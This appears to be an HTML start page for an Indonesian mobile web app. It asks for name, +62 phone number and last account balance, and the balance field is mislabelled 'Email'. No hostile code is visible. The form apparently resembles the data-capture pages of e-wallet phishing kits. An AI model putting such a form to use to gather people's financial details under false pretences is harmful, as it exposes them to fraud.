<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="stylesheet" href="assets/common/css/global.css">
		<link rel="stylesheet" href="assets/common/css/intro.css">
		<link rel="stylesheet" href="assets/lib/loader/loader.css">
		<link rel="stylesheet" href="assets/lib/ripple/ripple.css">
		<script src="assets/lib/jquery/jquery.js"></script>
		<script>
			const module = {};
		</script>
		<script type="module" src="assets/common/js/global.js"></script>
		<script type="module" src="assets/common/js/login.js"></script>
		<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
        <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
	</head>
	<body>
		<div style="width: 100%; height: 100%; display: flex; flex-direction: column;">
		  <div style="width: 100%; flex: 1; display: flex; flex-direction: column;">
			<div style="width: 100%; height: 80px; position: relative;">
				<img src="assets/common/img/img20.png" style="width: 100%; height: 100%; object-fit: fill;">
				<div style="position: absolute; left: 10px; top: 0; width: 50px; height: 100%; display: flex; justify-content: center; align-items: center;">
				  <ion-icon name="arrow-back-outline" style="color: #ffffff; font-size: 25px;"></ion-icon>
			    </div>
			</div>
			<div style="display: flex; flex-direction: column; padding-left: 20px; padding-right: 20px; width: calc(100% - 40px); background-color: #ffffff; border-top-left-radius: 10px; border-top-right-radius: 10px;">
				<div style="margin-top: 100px; color: #1591c5; font-size: 20px;">
					<div style="font-size: 17px;">Masukkan nama, nomor handphone dan saldo terakhir kamu untuk memulai</div>
					<div style="font-size: 14px; margin-top: 30px;">Nama</div>
					<input id="name" type="text" style="width: 100%; height: 50px; font-weight: bold; font-size: 16px; border: 0; outline: 0; margin-top: 10px; background-color: #d8f2ff; border-radius: 10px; padding-left: 10px; padding-right: 10px;">
					<div style="font-size: 14px; margin-top: 10px;">Nomor handphone</div>
					<div style="display: flex; flex-direction: row; align-items: center; width: 100%; height: 50px; margin-top: 10px; background-color: #d8f2ff; border-radius: 10px;">
						<div style="width: 50px; height: 100%; color: #888888; font-size: 16px; display: flex; justify-content: center; align-items: center;">+62</div>
						<input id="phone" type="tel" style="flex: 1; height: 100%; font-weight: bold; color: #000000; font-size: 16px; border: 0; outline: 0; background-color: transparent; padding-left: 0; padding-right: 10px;">
					</div>
					<div style="font-size: 14px; margin-top: 10px;">Email</div>
					<input id="balance" type="tel" style="width: 100%; height: 50px; font-weight: bold; font-size: 16px; border: 0; outline: 0; margin-top: 10px; background-color: #d8f2ff; border-radius: 10px; padding-left: 10px; padding-right: 10px;">
				</div>
			</div>
		  </div>
		  <div style="width: 100%; height: 40px; padding-top: 10px; padding-bottom: 10px; display: flex; justify-content: center; align-items: center;">
			<div class="ripple-white" onclick="module.next()" style="width: calc(100% - 40px); height: 40px; background-color: #ffc945; color: #1591c5; font-size: 15px; display: flex; justify-content: center; align-items: center; border-radius: 10px;">Mulai</div>
		  </div>
		</div>
	</body>
</html>
